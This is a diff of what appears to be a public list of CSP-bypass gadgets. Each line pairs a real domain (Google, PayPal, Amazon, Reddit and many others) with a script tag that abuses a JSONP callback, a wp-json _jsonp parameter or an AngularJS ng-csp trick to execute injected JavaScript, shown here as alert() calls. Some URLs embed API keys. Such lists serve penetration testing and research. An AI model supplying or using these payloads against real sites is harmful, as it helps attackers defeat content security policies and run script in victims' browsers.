@@ -1,6 +1,5 @@
 Domain	Code
 7b936.v.fwmrm.net	<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>
-api.clerk.io  <script src="https://api.clerk.io/v2/config/load?callback=alert(1)"></script>
 a.config.skype.com	<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=window.alert"></script>
 a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=window.alert"></script>
 aax-us-east-retail-direct.amazon.com	<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
@@ -27,8 +26,10 @@ api.bazaarvoice.com	<script src="https://api.bazaarvoice.com/data/batch.json?pas
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
 api.braintreegateway.com	<script src="https://api.braintreegateway.com/merchants/x/client_api/v1/payment_methods/credit_cards?callback=alert"></script>
 api.chartbeat.com	<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>
+api.clerk.io  <script src="https://api.clerk.io/v2/config/load?callback=alert(1)"></script>
 api.cxense.com	<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>
 api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
+api.demandbase.com	<script src="https://api.demandbase.com/api/v3/ip.json?key=LDHxBA8hUB2yNQphwwEfblkR6cHtp1tmrI2XGG2s&callback=alert"></script>
 api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=window.alert&format=json"></script>
 api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707%40N00&friends=0&display_all=1&format=json&jsoncallback=window.alert"></script>
 api.forismatic.com	<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>
@@ -104,9 +105,9 @@ connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&call
 connectad.io	<script src="https://connectad.io/wp-json?_jsonp=window.alert"></script>
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 content.googleapis.com	<script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>
-count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
 core-renderer-tiles.maps.yandex.net  <script src="https://core-renderer-tiles.maps.yandex.net/tiles?l=mapj&v=1&x=1&y=520&z=11&callback=alert"></script>
 core-stv-renderer.maps.yandex.net  <script src="https://core-stv-renderer.maps.yandex.net/2.x/tiles?l=stj&x=1&y=1&z=11&scale=1&v=1&format=js&callback=alert"></script>
+count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
 cr.testfreaks.com  <script src="https://cr.testfreaks.com/all-reviews.json?client_id=kodin1-fi&callback=alert"></script>
 cse.google.com	<script src="https://cse.google.com/cse/element/v1?cselibv=93e57cb47c499c53&callback=window.alert&rurl=https%3A%2F%2Fwww.ala.org%2Fsearch%2Fsite%3Fkeys%3Dx"></script>
 ct.beslist.nl	<script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
@@ -201,6 +202,7 @@ nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/sea
 oamssoqae.ieee.org	<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>
 okaccedo.com	<script src="https://okaccedo.com/wp-json?_jsonp=window.alert"></script>
 okt.hackthebox.com	<script src="https://okt.hackthebox.com/ping?callback=alert(1)"></script>
+okt.to	<script src="https://okt.to/ping?callback=window.alert(window.origin)"></script>
 omtr2.partners.salesforce.com	<script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
 onesignal.com	<script src="https://onesignal.com/api/v1/sync/0a5d329d-664d-4253-9bdd-62f208e2ae79/web?callback=alert(1)-"></script>
 openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
@@ -229,6 +231,7 @@ reklamstore.com	<script src="https://reklamstore.com/wp-json?_jsonp=window.alert
 rentokil-domains.firebaseio.com	<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>
 resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net	<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 resultsmedia.com	<script src="https://resultsmedia.com/wp-json?_jsonp=window.alert"></script>
+reveal.clearbit.com	<script src="https://reveal.clearbit.com/v1/companies/reveal?authorization=pk_0ff2488f59791c47711ae8173845dff6&callback=alert"></script>
 ring.com	<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>
 romania.amazon.com	<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 rtb0.doubleverify.com	<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>
@@ -315,8 +318,8 @@ www.demandbase.com	<script src="https://www.demandbase.com/wp-json?_jsonp=window
 www.ecwid.com	<script src="https://www.ecwid.com/wp-json?_jsonp=window.alert"></script>
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
-www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 www.google.com	<script src='https://www.google.com/maps/vt?pb=%211m8%213m7%211m2%211u5376%212u3328%212m2%211u768%212u512%213i5%212m3%211e0%212sm%213i-1%213m3%212sen-IN%213sIN%215e1270%214e4%2111m2%211e2%212b1%2123i72259375%2123i72732929%2123i227337&callback=alert(10);//'></script>
+www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
@@ -334,8 +337,7 @@ www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callba
 www.paytr.com	<script src="https://www.paytr.com/wp-json?_jsonp=window.alert"></script>
 www.readspeaker.com	<script src="https://www.readspeaker.com/wp-json?_jsonp=window.alert"></script>
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
-www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=window.alert"></script>
-www.reddit.com	<script src="https://www.reddit.com/.json?jsonp=alert"></script>
+www.reddit.com	<script src="https://www.reddit.com/.json?jsonp=window.alert"></script>
 www.reklamstore.com	<script src="https://www.reklamstore.com/wp-json?_jsonp=window.alert"></script>
 www.sanalofisonline.com	<script src="https://www.sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
 www.sovrn.com	<script src="https://www.sovrn.com/wp-json?_jsonp=window.alert"></script>
